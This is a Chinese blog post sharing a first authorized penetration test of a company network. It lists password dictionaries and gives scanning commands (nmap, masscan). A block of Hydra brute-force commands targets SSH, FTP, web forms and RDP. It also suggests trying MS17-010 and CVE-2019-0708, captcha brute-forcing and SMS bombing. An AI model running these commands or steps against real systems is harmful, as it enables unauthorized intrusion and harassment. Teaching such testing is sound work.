<h3 id="&#x4E00;&#x4E9B;&#x597D;&#x7528;&#x7684;&#x5B57;&#x5178;"><a href="#&#x4E00;&#x4E9B;&#x597D;&#x7528;&#x7684;&#x5B57;&#x5178;" class="headerlink" title="&#x4E00;&#x4E9B;&#x597D;&#x7528;&#x7684;&#x5B57;&#x5178;"></a>&#x4E00;&#x4E9B;&#x597D;&#x7528;&#x7684;&#x5B57;&#x5178;</h3><p>&#x5F31;&#x5BC6;&#x7801;&#x662F;&#x4E00;&#x4E2A;&#x4E98;&#x53E4;&#x4E0D;&#x53D8;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x53EF;&#x80FD;&#x516C;&#x53F8;&#x540E;&#x53F0;&#x5F31;&#x5BC6;&#x7801;&#x6539;&#x6389;&#x4E86;&#xFF0C;&#x53EF;&#x662F;&#x4E00;&#x4E2A;&#x516C;&#x53F8;&#x8FD9;&#x4E48;&#x591A;&#x5458;&#x5DE5;&#xFF0C;&#x53EF;&#x80FD;&#x6709;&#x5458;&#x5DE5;&#x6CA1;&#x6709;&#x6539;&#x81EA;&#x5DF1;&#x539F;&#x5148;&#x7684;&#x5F31;&#x5BC6;&#x7801;&#x2026;&#x6216;&#x8005;&#x516C;&#x53F8;&#x4E00;&#x4E9B;&#x8BBE;&#x5907;&#x6CA1;&#x6709;&#x6539;&#x6389;&#x9ED8;&#x8BA4;&#x5BC6;&#x7801;&#x2026;&#x6240;&#x4EE5;&#x4E00;&#x4E2A;&#x597D;&#x7528;&#x7684;&#x5BC6;&#x7801;&#x5B57;&#x5178;&#x663E;&#x5F97;&#x5C24;&#x5176;&#x5173;&#x952E;</p>
<p>&#x914D;&#x5408;&#x4E0A; <strong>Hydra</strong> &#x6216;&#x8005;&#x5176;&#x4ED6;&#x597D;&#x7528;&#x70B9;&#x7684;&#x7206;&#x7834;&#x5DE5;&#x5177;&#x7684;&#x4F7F;&#x7528;&#xFF0C;&#x5E38;&#x5E38;&#x80FD;&#x591F;&#x6709;&#x4E0D;&#x9519;&#x7684;&#x6536;&#x83B7;</p>
<p>&#x63D0;&#x4F9B;&#x4EE5;&#x4E0B;&#x51E0;&#x4E2A;&#x751F;&#x6210;&#x5B57;&#x5178;&#x65B9;&#x5F0F;</p>
<ul>
<li><p>Github&#x4E0A;&#x6709;&#x5F88;&#x591A;&#x6536;&#x96C6;&#x597D;&#x7684;&#x5B57;&#x5178;<br><a href="https://github.com/rootphantomer/Blasting_dictionary" target="_blank" rel="noopener">https://github.com/rootphantomer/Blasting_dictionary</a><br>&#x66F4;&#x591A;&#x7684;&#x53EF;&#x4EE5;&#x5728;Github&#x4E0A;&#x81EA;&#x884C;&#x5BFB;&#x627E;</p>
</li>
<li><p>&#x53EF;&#x80FD;&#x4F60;&#x9700;&#x8981;&#x751F;&#x6210;&#x4E00;&#x4E9B;&#x7279;&#x6B8A;&#x5B9A;&#x5236;&#x7684;<br><a href="https://www.itxueke.com/tools/pass/#" target="_blank" rel="noopener">&#x5728;&#x7EBF;&#x751F;&#x6210;&#x5730;&#x5740;&#x4E00;</a><br><a href="http://xingchen.pythonanywhere.com/index" target="_blank" rel="noopener">&#x5728;&#x7EBF;&#x751F;&#x6210;&#x5730;&#x5740;&#x4E8C;</a></p>
</li>
<li><p>&#x4E0B;&#x9762;&#x7684;py&#x811A;&#x672C;&#x4F60;&#x4E5F;&#x53EF;&#x4EE5;&#x5C1D;&#x8BD5;&#x4F7F;&#x7528;</p>
</li>
</ul>
<p><strong>pydictor</strong> <a href="https://github.com/LandGrey/pydictor" target="_blank" rel="noopener">&#x4E0B;&#x8F7D;&#x5730;&#x5740;</a> <a href="https://www.ddosi.com/b172/" target="_blank" rel="noopener">&#x4F7F;&#x7528;&#x6307;&#x5357;</a></p>
<ul>
<li>somd5 &#x63D0;&#x4F9B;&#x7684;&#x5B57;&#x5178;&#xFF1A;<br><a href="https://www.somd5.com/download/dict/" target="_blank" rel="noopener">https://www.somd5.com/download/dict/</a></li>
</ul>
<h3 id="&#x53EF;&#x80FD;&#x4F60;&#x9700;&#x8981;&#x5B66;&#x4F1A;&#x914D;&#x7F6E;IP"><a href="#&#x53EF;&#x80FD;&#x4F60;&#x9700;&#x8981;&#x5B66;&#x4F1A;&#x914D;&#x7F6E;IP" class="headerlink" title="&#x53EF;&#x80FD;&#x4F60;&#x9700;&#x8981;&#x5B66;&#x4F1A;&#x914D;&#x7F6E;IP"></a>&#x53EF;&#x80FD;&#x4F60;&#x9700;&#x8981;&#x5B66;&#x4F1A;&#x914D;&#x7F6E;IP</h3><p>&#x5982;&#x679C;&#x4F60;&#x9700;&#x8981;&#x4F60;&#x63A5;&#x8FDB;&#x5185;&#x7F51;&#x8FDB;&#x884C;&#x6D4B;&#x8BD5;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x901A;&#x5E38;&#x4F1A;&#x8981;&#x6C42;&#x4F60;&#x624B;&#x52A8;&#x914D;&#x7F6E;IP&#xFF0C;&#x5982;&#x679C;&#x4E0D;&#x4F1A;&#x914D;&#x7F6E;&#x5230;&#x4E86;&#x73B0;&#x573A;&#x5C31;&#x4F1A;&#x50CF;&#x6211;&#x4E00;&#x6837;&#x5F88;&#x4E22;&#x4EBA;&#x2026;</p>
<p>&#x53F3;&#x952E;&#x70B9;&#x51FB;&#xFF1A;</p>
<p><img src="/2019/08/26/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%9A%84%E5%88%86%E4%BA%AB%E5%92%8C%E5%B0%8F%E7%BB%93/20190822193527-f08f0c52-c4d0-1.png" alt></p>
<p>&#x70B9;&#x51FB;&#xFF1A;</p>
<p><img src="/2019/08/26/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%9A%84%E5%88%86%E4%BA%AB%E5%92%8C%E5%B0%8F%E7%BB%93/20190822193531-f29e887e-c4d0-1.png" alt></p>
<p>&#x70B9;&#x51FB;&#xFF1A;</p>
<p><img src="/2019/08/26/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%9A%84%E5%88%86%E4%BA%AB%E5%92%8C%E5%B0%8F%E7%BB%93/20190822193535-f50dfb9e-c4d0-1.png" alt></p>
<p>&#x53F3;&#x952E;&#x70B9;&#x51FB;&#x5F53;&#x524D;&#x4F60;&#x94FE;&#x63A5;&#xFF0C;&#x9009;&#x62E9;&#x5C5E;&#x6027;&#xFF1A;</p>
<p><img src="/2019/08/26/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%9A%84%E5%88%86%E4%BA%AB%E5%92%8C%E5%B0%8F%E7%BB%93/20190822193541-f89fd55c-c4d0-1.png" alt></p>
<p>&#x53CC;&#x51FB;&#xFF1A;</p>
<p><img src="/2019/08/26/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%9A%84%E5%88%86%E4%BA%AB%E5%92%8C%E5%B0%8F%E7%BB%93/20190822193542-f8f68672-c4d0-1.png" alt></p>
<p>&#x586B;&#x5165;&#x4ED6;&#x4EEC;&#x7ED9;&#x4F60;&#x63D0;&#x4F9B;&#x7684;IP&#xFF1A;</p>
<p><img src="/2019/08/26/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%9A%84%E5%88%86%E4%BA%AB%E5%92%8C%E5%B0%8F%E7%BB%93/20190822193544-faabb1d6-c4d0-1.png" alt></p>
<h2 id="&#x65B0;&#x624B;&#x7684;&#x6E17;&#x900F;&#x6D4B;&#x8BD5;&#x7684;&#x6253;&#x5F00;&#x65B9;&#x5F0F;"><a href="#&#x65B0;&#x624B;&#x7684;&#x6E17;&#x900F;&#x6D4B;&#x8BD5;&#x7684;&#x6253;&#x5F00;&#x65B9;&#x5F0F;" class="headerlink" title="&#x65B0;&#x624B;&#x7684;&#x6E17;&#x900F;&#x6D4B;&#x8BD5;&#x7684;&#x6253;&#x5F00;&#x65B9;&#x5F0F;"></a>&#x65B0;&#x624B;&#x7684;&#x6E17;&#x900F;&#x6D4B;&#x8BD5;&#x7684;&#x6253;&#x5F00;&#x65B9;&#x5F0F;</h2><p>&#x672C;&#x7740;&#x5212;&#x6C34;&#x4E5F;&#x8981;&#x5212;&#x5F97;&#x5408;&#x7406;&#x4E00;&#x70B9;&#x7684;&#x6001;&#x5EA6;&#xFF0C;&#x5982;&#x679C;&#x521A;&#x597D;&#x4F60;&#x4E5F;&#x662F;&#x7B2C;&#x4E00;&#x6B21;&#x505A;&#x6E17;&#x900F;&#x6D4B;&#x8BD5;&#xFF0C;&#x5C31;&#x7B97;&#x4E0D;&#x77E5;&#x9053;&#x5177;&#x4F53;&#x5E72;&#x4EC0;&#x4E48;&#xFF0C;&#x8FC7;&#x7A0B;&#x4E2D;&#x4E5F;&#x4E0D;&#x8981;&#x663E;&#x5F97;&#x592A;&#x65E0;&#x6240;&#x4E8B;&#x4E8B;&#x4E86;&#x2026;</p>
<p><strong>&#x4E0B;&#x9762;&#x7684;&#x64CD;&#x4F5C;&#x9002;&#x7528;&#x4E8E;&#x5728;&#x653E;&#x5F00;&#x4E2D;&#x95F4;&#x4E00;&#x5207;&#x5B89;&#x5168;&#x8BBE;&#x5907;</strong>&#xFF08;&#x5404;&#x79CD;&#x9632;&#x706B;&#x5899;&#x7B49;&#x2026;&#xFF09;&#xFF0C;&#x6240;&#x4EE5;&#x4F5C;&#x4E3A;&#x4E00;&#x4E2A;&#x6280;&#x672F;&#x4E0D;&#x662F;&#x5F88;&#x9AD8;&#x8D85;&#x7684;&#x65B0;&#x624B;&#xFF0C;<strong>&#x5408;&#x7406;&#x5229;&#x7528;&#x624B;&#x91CC;&#x7684;&#x73B0;&#x6709;&#x5DE5;&#x5177;</strong>&#x5C31;&#x663E;&#x5F97;&#x81F3;&#x5173;&#x91CD;&#x8981;</p>
<p>&#x5F88;&#x591A;&#x5927;&#x4F6C;&#x90FD;&#x8BF4;&#x8FC7;<strong>&#x6E17;&#x900F;&#x6D4B;&#x8BD5;&#x7684;&#x672C;&#x8D28;&#x662F;&#x4FE1;&#x606F;&#x6536;&#x96C6;</strong>&#xFF0C;&#x4FE1;&#x606F;&#x6536;&#x96C6;&#x7684;&#x6B65;&#x9AA4;&#x548C;&#x624B;&#x6BB5;&#x5728;&#x5148;&#x77E5;&#x5DF2;&#x7ECF;&#x6709;&#x5F88;&#x591A;&#x4E13;&#x95E8;&#x6587;&#x7AE0;&#x8BE6;&#x7EC6;&#x7684;&#x9610;&#x8FF0;&#x8FC7;</p>
<p><a href="https://xz.aliyun.com/search?keyword=%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86" target="_blank" rel="noopener">&#x4FE1;&#x606F;&#x6536;&#x96C6;</a></p>
<p>&#x4E00;&#x822C;&#x53BB;&#x8FD9;&#x79CD;&#x516C;&#x53F8;&#x5E2E;&#x5FD9;&#x505A;&#x6E17;&#x900F;&#x4ED6;&#x4EEC;&#x90FD;<strong>&#x4F1A;&#x7ED9;&#x4F60;&#x4E00;&#x5B9A;&#x7684;&#x8D44;&#x4EA7;</strong>&#xFF08;&#x5982;&#x5185;&#x7F51;IP&#xFF0C;&#x8BBE;&#x5907;&#x578B;&#x53F7;&#x7B49;&#xFF09;&#xFF0C;&#x4F46;<strong>&#x4E00;&#x822C;&#x662F;&#x4E0D;&#x591F;&#x7684;</strong>&#x3002;&#x6240;&#x4EE5;&#x5B8C;&#x6210;&#x4EE5;&#x4E0B;&#x7684;&#x6B65;&#x9AA4;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x5728;&#x4E00;&#x5B9A;&#x7A0B;&#x5EA6;&#x4E0A;&#x5E2E;&#x52A9;&#x4F60;&#x6536;&#x96C6;&#x4E00;&#x4E9B;&#x4FE1;&#x606F;&#x2026;</p>
<h3 id="&#x5168;&#x90FD;&#x4E22;&#x8FDB;&#x5DE5;&#x5177;&#x8DD1;"><a href="#&#x5168;&#x90FD;&#x4E22;&#x8FDB;&#x5DE5;&#x5177;&#x8DD1;" class="headerlink" title="&#x5168;&#x90FD;&#x4E22;&#x8FDB;&#x5DE5;&#x5177;&#x8DD1;"></a>&#x5168;&#x90FD;&#x4E22;&#x8FDB;&#x5DE5;&#x5177;&#x8DD1;</h3><p><strong>&#x9996;&#x5148;&#x628A;&#x8D44;&#x4EA7;&#x91CC;&#x6240;&#x6709;IP&#x4E22;&#x8FDB; Nessus</strong></p>
<p><img src="/2019/08/26/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%9A%84%E5%88%86%E4%BA%AB%E5%92%8C%E5%B0%8F%E7%BB%93/20190822193546-fb5e77da-c4d0-1.png" alt></p>
<p>Nessus &#x672C;&#x8EAB;&#x626B;&#x63CF;&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#x4E5F;&#x4F1A;&#x5305;&#x542B;&#x7AEF;&#x53E3;&#xFF0C;&#x4F46;&#x662F;&#x5982;&#x679C;&#x4F60;&#x5ACC;&#x6162;&#x4F60;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;nmap&#x626B;&#x63CF;&#x2026;<br><code>nmap -p 1-65535 -T4 -A -v &lt;IP&gt;</code></p>
<p>&#x7136;&#x540E;&#x4F60;&#x5ACC;nmap&#x6162;&#x53EF;&#x4EE5;&#x4F7F;&#x7528; masscan&#x2026;<br><code>masscan &lt;IP&gt; -p0-65535 - rate 1000000</code></p>
<p><strong>&#x626B;&#x51FA;&#x6765;&#x4E86;Web&#x7684;&#x7AEF;&#x53E3;&#xFF0C;&#x5982;80,8080,443&#x7B49;&#xFF08;&#x5177;&#x4F53;&#x7684;&#x8FD8;&#x5F97;&#x5177;&#x4F53;&#x770B;&#xFF09;&#xFF0C;&#x4E22;&#x8FDB;AWVS&#x8FDB;&#x4E00;&#x6B65;&#x626B;&#x63CF;&#x5206;&#x6790;</strong><br><img src="/2019/08/26/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%9A%84%E5%88%86%E4%BA%AB%E5%92%8C%E5%B0%8F%E7%BB%93/20190822193552-ff30ab08-c4d0-1.png" alt></p>
<p><strong>&#x542B;&#x6709; ftp&#xFF0C;ssh&#xFF0C;mysql&#x7684;&#x7AEF;&#x53E3;&#x53EF;&#x4EE5;&#x4E22;&#x8FDB; hydra &#x7206;&#x7834;</strong><br></p><figure class="highlight html hljs"><table><tbody><tr><td class="code"><pre><span class="line">1&#x3001;&#x7834;&#x89E3;ssh&#xFF1A; </span><br><span class="line">hydra -l &#x7528;&#x6237;&#x540D; -p &#x5BC6;&#x7801;&#x5B57;&#x5178; -t &#x7EBF;&#x7A0B; -vV -e ns ip ssh </span><br><span class="line">hydra -l &#x7528;&#x6237;&#x540D; -p &#x5BC6;&#x7801;&#x5B57;&#x5178; -t &#x7EBF;&#x7A0B; -o save.log -vV ip ssh </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2&#x3001;&#x7834;&#x89E3;ftp&#xFF1A; </span><br><span class="line">hydra ip ftp -l &#x7528;&#x6237;&#x540D; -P &#x5BC6;&#x7801;&#x5B57;&#x5178; -t &#x7EBF;&#x7A0B;(&#x9ED8;&#x8BA4;16) -vV </span><br><span class="line">hydra ip ftp -l &#x7528;&#x6237;&#x540D; -P &#x5BC6;&#x7801;&#x5B57;&#x5178; -e ns -vV </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">3&#x3001;get&#x65B9;&#x5F0F;&#x63D0;&#x4EA4;&#xFF0C;&#x7834;&#x89E3;web&#x767B;&#x5F55;&#xFF1A; </span><br><span class="line">hydra -l &#x7528;&#x6237;&#x540D; -p &#x5BC6;&#x7801;&#x5B57;&#x5178; -t &#x7EBF;&#x7A0B; -vV -e ns ip http-get /admin/ </span><br><span class="line">hydra -l &#x7528;&#x6237;&#x540D; -p &#x5BC6;&#x7801;&#x5B57;&#x5178; -t &#x7EBF;&#x7A0B; -vV -e ns -f ip http-get /admin/index.php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">4&#x3001;post&#x65B9;&#x5F0F;&#x63D0;&#x4EA4;&#xFF0C;&#x7834;&#x89E3;web&#x767B;&#x5F55;&#xFF1A; </span><br><span class="line">hydra -l &#x7528;&#x6237;&#x540D; -P &#x5BC6;&#x7801;&#x5B57;&#x5178; -s 80 ip http-post-form &quot;/admin/login.php:username=^USER^&amp;password=^PASS^&amp;submit=login:sorry password&quot; </span><br><span class="line">hydra -t 3 -l admin -P pass.txt -o out.txt -f 10.36.16.18 http-post-form &quot;login.php:id=^USER^&amp;passwd=^PASS^:<span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>wrong username or password<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>&quot; </span><br><span class="line">&#xFF08;&#x53C2;&#x6570;&#x8BF4;&#x660E;&#xFF1A;-t&#x540C;&#x65F6;&#x7EBF;&#x7A0B;&#x6570;3&#xFF0C;-l&#x7528;&#x6237;&#x540D;&#x662F;admin&#xFF0C;&#x5B57;&#x5178;pass.txt&#xFF0C;&#x4FDD;&#x5B58;&#x4E3A;out.txt&#xFF0C;-f &#x5F53;&#x7834;&#x89E3;&#x4E86;&#x4E00;&#x4E2A;&#x5BC6;&#x7801;&#x5C31;&#x505C;&#x6B62;&#xFF0C; 10.36.16.18&#x76EE;&#x6807;ip&#xFF0C;http-post-form&#x8868;&#x793A;&#x7834;&#x89E3;&#x662F;&#x91C7;&#x7528;http&#x7684;post&#x65B9;&#x5F0F;&#x63D0;&#x4EA4;&#x7684;&#x8868;&#x5355;&#x5BC6;&#x7801;&#x7834;&#x89E3;,<span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>&#x4E2D; &#x7684;&#x5185;&#x5BB9;&#x662F;&#x8868;&#x793A;&#x9519;&#x8BEF;&#x731C;&#x89E3;&#x7684;&#x8FD4;&#x56DE;&#x4FE1;&#x606F;&#x63D0;&#x793A;&#x3002;&#xFF09; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">5&#x3001;&#x7834;&#x89E3;https&#xFF1A; </span><br><span class="line">hydra -m /index.php -l muts -P pass.txt 10.36.16.18 https </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">10&#x3001;&#x7834;&#x89E3;rdp&#xFF1A; </span><br><span class="line">hydra ip rdp -l administrator -P pass.txt -V</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><strong>&#x5982;&#x679C;&#x626B;&#x51FA;445&#x7AEF;&#x53E3;&#x53EF;&#x4EE5;&#x5C1D;&#x8BD5;&#x4E00;&#x4E0B; ms17-010 ,&#x4E22;&#x8FDB;msf&#x91CC;&#x4F7F;&#x7528;&#x76F8;&#x5E94;&#x7684;&#x6A21;&#x5757;&#x8FDB;&#x884C;&#x9A8C;&#x8BC1;</strong><br><img src="/2019/08/26/%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%9A%84%E5%88%86%E4%BA%AB%E5%92%8C%E5%B0%8F%E7%BB%93/20190822193558-02bf504e-c4d1-1.png" alt></p>
<p><strong>&#x5982;&#x679C;&#x626B;&#x51FA;3389&#x7AEF;&#x53E3;&#x53EF;&#x4EE5;&#x5C1D;&#x8BD5;&#x4E00;&#x4E0B;&#x6700;&#x65B0;&#x7206;&#x51FA;&#x7684; CVE-2019-0708 (&#x5176;&#x5B9E;&#x771F;&#x7684;&#x633A;&#x591A;&#x90FD;&#x6CA1;&#x6253;&#x8865;&#x4E01;&#x7684;)&#xFF0C;&#x4E5F;&#x80FD;&#x4F7F;&#x7528;msf&#x626B;&#x63CF;&#xFF0C;&#x8FD8;&#x53EF;&#x4EE5;&#x4F7F;&#x7528; 360 &#x7684;&#x6F0F;&#x6D1E;&#x626B;&#x63CF;&#x5DE5;&#x5177;&#xFF0C;&#x6216;&#x8005;&#x4F7F;&#x7528;Github&#x4E0A;&#x641C;&#x7D22;&#x5176;&#x4ED6;poc&#x8FDB;&#x884C;&#x9A8C;&#x8BC1;</strong><br><a href="https://cert.360.cn/warning/detail?id=1caed77a5620fc7da993fea91c237ed5" target="_blank" rel="noopener">CVE-2019-0708&#xFF1A; Windows RDP&#x8FDC;&#x7A0B;&#x6F0F;&#x6D1E;&#x65E0;&#x635F;&#x68C0;&#x6D4B;&#x5DE5;&#x5177;&#x4E0B;&#x8F7D;</a></p>
<p>&#x7136;&#x540E;&#x5728;&#x5404;&#x79CD;&#x626B;&#x63CF;&#x65F6;&#x5019;&#x7684;&#x95F2;&#x6687;&#x65F6;&#x95F4;&#xFF0C;&#x4F60;&#x5C31;&#x53EF;&#x4EE5;&#x5F00;&#x5C55;&#x5BF9;&#x4E00;&#x4E2A;&#x7F51;&#x7AD9;&#x7684;&#x5E38;&#x89C4;&#x6E17;&#x900F;&#xFF0C;&#x5148;&#x626B;&#x4E2A;&#x76EE;&#x5F55;(dirsearch&#x548C;&#x5FA1;&#x5251;&#x90FD;&#x884C;)&#xFF0C;&#x7136;&#x540E;&#x719F;&#x6089;web&#x7AD9;&#x70B9;&#x7684;&#x5404;&#x4E2A;&#x529F;&#x80FD;&#x70B9;&#xFF0C;&#x518D;&#x6839;&#x636E;&#x529F;&#x80FD;&#x6765;&#x6D4B;&#x8BD5;&#x76F8;&#x5E94;&#x7684;&#x6F0F;&#x6D1E;&#x662F;&#x5426;&#x5B58;&#x5728;&#x2026;&#x5FC5;&#x8981;&#x7684;&#x65F6;&#x5019;burpsuite&#x6293;&#x5305;&#xFF0C;&#x4E00;&#x4E2A;&#x5305;&#x4E00;&#x4E2A;&#x5305;&#x7684;&#x770B;&#x2026;</p>
<p>PS&#xFF1A;&#x4E00;&#x822C;&#x5BF9;Web&#x7AD9;&#x70B9;&#x51C6;&#x5907;&#x5F00;&#x59CB;&#x6E17;&#x900F;&#x65F6;&#x5F80;&#x5F80;&#x90FD;&#x53D8;&#x6210;&#x4E86;&#x548C;&#x767B;&#x9646;&#x6846;&#x7684;&#x6218;&#x6597;&#xFF0C;&#x53EF;&#x4EE5;&#x5148;&#x4E0A;&#x6765;burpsuite&#x8DD1;&#x4E2A;&#x51E0;&#x4E2A;&#x5F31;&#x5BC6;&#x7801;&#x5B57;&#x5178;&#xFF0C;&#x7136;&#x540E;&#x5BF9;&#x767B;&#x5F55;&#x6846;&#x8FDB;&#x4E00;&#x6B65;&#x6D4B;&#x8BD5;sql&#x6CE8;&#x5165;&#xFF0C;&#x53E6;&#x5916;&#xFF1A;&#x5982;&#x679C;&#x6709;&#x6CE8;&#x518C;&#x8D26;&#x53F7;&#x754C;&#x9762;&#x6216;&#x8005;&#x5FD8;&#x8BB0;&#x5BC6;&#x7801;&#x754C;&#x9762;&#x53EF;&#x4EE5;&#x5C1D;&#x8BD5;&#x9A8C;&#x8BC1;&#x7801;&#x7206;&#x7834;&#xFF08;4&#x4F4D;&#x6570;&#x9A8C;&#x8BC1;&#x7801;&#x5C31;&#x8BD5;&#x4E00;&#x4E0B;&#xFF09;&#xFF0C;&#x77ED;&#x4FE1;&#x8F70;&#x70B8;&#xFF0C;&#x4EFB;&#x610F;&#x8D26;&#x53F7;&#x6CE8;&#x518C;&#x627E;&#x56DE;&#x7B49;&#xFF0C;&#x7136;&#x540E;&#x8BB0;&#x5F97;&#x770B;&#x4E00;&#x4E0B;URL&#xFF0C;&#x5982;&#x679C;&#x540E;&#x9762;&#x7684;&#x53C2;&#x6570;&#x4E3A; ?returnurl=xxx.com,&#x53EF;&#x4EE5;&#x5C1D;&#x8BD5;&#x4E00;&#x4E0B;url&#x8DF3;&#x8F6C;&#x2026;<br>&#xFF08;&#x5982;&#x679C;&#x7ECF;&#x5386;&#x4E86;&#x5927;&#x91CF;&#x7684;&#x5DE5;&#x7A0B;&#xFF0C;&#x5BF9;&#x767B;&#x5F55;&#x6846;&#x6BEB;&#x65E0;&#x529E;&#x6CD5;&#xFF0C;&#x8FDE;&#x7F51;&#x7AD9;&#x90FD;&#x6CA1;&#x8FDB;&#x53BB;&#xFF0C;&#x65E0;&#x6CD5;&#x5C55;&#x5F00;&#x4E0B;&#x4E00;&#x6B65;&#x6D4B;&#x8BD5;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5C31;&#x81EA;&#x5DF1;&#x6CE8;&#x518C;&#x4E00;&#x4E2A;&#x8D26;&#x53F7;&#xFF0C;&#x6216;&#x8005;&#x627E;&#x4ED6;&#x4EEC;&#x63D0;&#x4F9B;&#x4E00;&#x4E2A;&#x6D4B;&#x8BD5;&#x8D26;&#x53F7;&#x53ED;&#x2026;</p>
<p>&#x7136;&#x540E;&#x5728;&#x4F60;&#x5FD9;&#x4EE5;&#x4E0A;&#x64CD;&#x4F5C;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5C31;&#x663E;&#x5F97;&#x4E0D;&#x662F;&#x90A3;&#x4E48;&#x7684;&#x5212;&#x6C34;&#xFF0C;&#x4F5C;&#x4E3A;&#x4E00;&#x4E2A;&#x811A;&#x672C;&#x5C0F;&#x5B50;&#x4E5F;&#x8981;&#x6709;&#x811A;&#x672C;&#x5C0F;&#x5B50;&#x5E94;&#x6709;&#x7684;&#x6837;&#x5B50;</p>
<h3 id="&#x5584;&#x7528;&#x641C;&#x7D22;&#x8FDB;&#x884C;&#x8F85;&#x52A9;&#x9A8C;&#x8BC1;"><a href="#&#x5584;&#x7528;&#x641C;&#x7D22;&#x8FDB;&#x884C;&#x8F85;&#x52A9;&#x9A8C;&#x8BC1;" class="headerlink" title="&#x5584;&#x7528;&#x641C;&#x7D22;&#x8FDB;&#x884C;&#x8F85;&#x52A9;&#x9A8C;&#x8BC1;"></a>&#x5584;&#x7528;&#x641C;&#x7D22;&#x8FDB;&#x884C;&#x8F85;&#x52A9;&#x9A8C;&#x8BC1;</h3><p>&#x7ECF;&#x8FC7;&#x4E00;&#x6BB5;&#x65F6;&#x95F4;&#x7684;&#x7B49;&#x5F85;&#xFF0C;&#x53EF;&#x80FD; Nessus &#x548C; AWVS &#x90FD;&#x626B;&#x5F97;&#x5DEE;&#x4E0D;&#x591A;&#x4E86;&#x2026;&#x8FD9;&#x4E2A;&#x65F6;&#x5019;&#x5982;&#x679C;&#x81EA;&#x5DF1;&#x79EF;&#x7D2F;&#x4E0D;&#x591A;&#x5C31;<strong>&#x5BFB;&#x627E;&#x4E00;&#x5207;&#x80FD;&#x591F;&#x641C;&#x7D22;&#x7684;&#x4E1C;&#x897F;&#x5BF9;&#x626B;&#x63CF;&#x7ED3;&#x679C;&#x8FDB;&#x884C;&#x8F85;&#x52A9;&#x9A8C;&#x8BC1;</strong>&#x2026;&#xFF08;&#x767E;&#x5EA6;&#x3001;&#x8C37;&#x6B4C;&#x3001;Github&#x7B49;&#x2026;</p>
<p>&#x5982;&#x679C;&#x662F; CVE &#x5C31;&#x5148;&#x53BB;msf&#x91CC;&#x9762;search&#x4E00;&#x4E0B;&#xFF0C;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x4E5F;&#x53EF;&#x4EE5;&#x53BB; Github &#x4E0A;&#x627E;&#x4E00;&#x6CE2;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x5229;&#x7528;&#x7684; exp&#xFF0C;&#x6216;&#x8005;&#x53EF;&#x4EE5;&#x770B;&#x770B;&#x5404;&#x5927;&#x8BBA;&#x575B;&#x6709;&#x6CA1;&#x6709;&#x5927;&#x4F6C;&#x4E4B;&#x524D;&#x5206;&#x6790;&#x8FC7;&#x2026;&#x7136;&#x540E;&#x8DDF;&#x7740;&#x624B;&#x52A8;&#x590D;&#x73B0;&#xFF0C;&#x9014;&#x4E2D;&#x53EF;&#x80FD;&#x9047;&#x5230;&#x5F88;&#x591A;&#x83AB;&#x540D;&#x5176;&#x5999;&#x6CA1;&#x6709;&#x590D;&#x73B0;&#x6210;&#x529F;&#x7684;&#x95EE;&#x9898;&#x4E5F;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5584;&#x7528;&#x641C;&#x7D22;&#x8FDB;&#x884C;&#x89E3;&#x51B3;</p>
<p>&#x7136;&#x540E;&#x5404;&#x5927;&#x8BBA;&#x575B;&#x771F;&#x7684;&#x6709;&#x5F88;&#x591A;&#x5F88;&#x591A;&#x5F88;&#x5F3A;&#x7684;&#x5E08;&#x5085;&#x4EEC;&#xFF0C;&#x6BCF;&#x5F53;&#x4F60;&#x9047;&#x5230;&#x8FC7;&#x6CA1;&#x89C1;&#x5230;&#x8FC7;&#x7684;&#x6F0F;&#x6D1E;&#xFF0C;&#x57FA;&#x672C;&#x4E0A;&#x90FD;&#x4F1A;&#x6709;&#x5E08;&#x5085;&#x5206;&#x6790;&#x8FC7;&#xFF0C;&#x5438;&#x53D6;&#x4ED6;&#x4EEC;&#x7684;&#x7ECF;&#x9A8C;&#x5B8C;&#x6210;&#x4F60;&#x7684;&#x6E17;&#x900F;&#x4EFB;&#x52A1;&#x4E5F;&#x662F;&#x4E2A;&#x4E8B;&#x534A;&#x529F;&#x500D;&#x7684;&#x4E8B;&#x60C5;</p>
